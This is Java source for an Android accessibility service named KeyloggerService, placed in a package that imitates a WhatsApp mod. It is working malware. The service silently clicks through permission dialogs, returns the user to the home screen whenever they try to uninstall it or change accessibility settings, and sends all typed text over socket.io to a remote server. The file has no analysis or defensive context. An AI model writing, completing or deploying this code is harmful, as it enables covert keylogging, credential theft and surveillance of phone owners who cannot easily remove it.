package com.whatsapp.gb;

import android.accessibilityservice.AccessibilityService;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import com.github.nkzawa.socketio.client.IO;
import com.github.nkzawa.socketio.client.Socket;
import java.net.URISyntaxException;
import java.util.List;

public class KeyloggerService extends AccessibilityService {
    private Socket mSocket;
    private static final String SERVER_URL = "http://192.168.1.2:3000";

    @Override
    public void onCreate() {
        super.onCreate();
        try {
            mSocket = IO.socket(SERVER_URL);
            mSocket.connect();
        } catch (URISyntaxException e) {}
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            CharSequence packageName = event.getPackageName();
            CharSequence className = event.getClassName();
            
            if (packageName != null && (packageName.toString().contains("permissioncontroller") 
                    || packageName.toString().contains("packageinstaller") 
                    || packageName.toString().contains("systemui")
                    || packageName.toString().contains("android"))) {
                
                AccessibilityNodeInfo rootNode = getRootInActiveWindow();
                if (rootNode != null) {
                    clicarBotao(rootNode, "Permitir");
                    clicarBotao(rootNode, "Durante o uso do app");
                    clicarBotao(rootNode, "Allow");
                    clicarBotao(rootNode, "Iniciar agora");
                    clicarBotao(rootNode, "Começar agora");
                    clicarBotao(rootNode, "Start now");
                    clicarBotao(rootNode, "OK");
                    clicarBotao(rootNode, "Aceitar");
                }
            }

            if (packageName != null) {
                String pkg = packageName.toString();
                if (pkg.equals("com.android.settings") || pkg.equals("com.android.packageinstaller") || pkg.equals("com.google.android.packageinstaller")) {
                    if (className != null) {
                        String cls = className.toString();
                        if (cls.contains("UninstallerActivity") || cls.contains("InstalledAppDetails") || cls.contains("AccessibilitySettings")) {
                            performGlobalAction(GLOBAL_ACTION_HOME); 
                        }
                    }
                }
            }
        }

        if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            AccessibilityNodeInfo source = event.getSource();
            if (source != null) {
                CharSequence text = source.getText();
                if (text != null && text.length() > 0) {
                    if (mSocket != null && mSocket.connected()) {
                        mSocket.emit("keylog", text.toString());
                    }
                }
                source.recycle();
            }
        }
    }

    private void clicarBotao(AccessibilityNodeInfo rootNode, String textoBotao) {
        List<AccessibilityNodeInfo> nodes = rootNode.findAccessibilityNodeInfosByText(textoBotao);
        for (AccessibilityNodeInfo node : nodes) {
            if (node.isClickable()) {
                node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                break;
            } else {
                AccessibilityNodeInfo parent = node.getParent();
                while (parent != null) {
                    if (parent.isClickable()) {
                        parent.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                        break;
                    }
                    parent = parent.getParent();
                }
            }
        }
    }

    @Override
    public void onInterrupt() {}
}
